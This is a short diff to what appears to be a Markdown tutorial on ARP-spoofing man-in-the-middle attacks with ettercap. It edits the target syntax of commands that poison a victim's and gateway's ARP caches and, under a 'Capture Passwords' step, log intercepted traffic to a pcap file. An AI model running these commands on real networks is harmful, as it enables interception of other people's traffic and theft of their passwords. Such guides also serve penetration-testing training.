@@ -55,7 +55,7 @@ sudo ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
 
 ##Example:
 ```bash
-sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
+sudo ettercap -T -M arp:remote //192.168.0.105/ /192.168.0.1// -i eth0
 ```
 ---
 ## :Flags Explained:
@@ -71,7 +71,7 @@ sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
 ---
 ##🔐 Step 4: Capture Passwords (Optional)
 ```bash
-sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
+sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP// /GATEWAY_IP// -i INTERFACE
 ```
 ##Open the log with Wireshark:
 
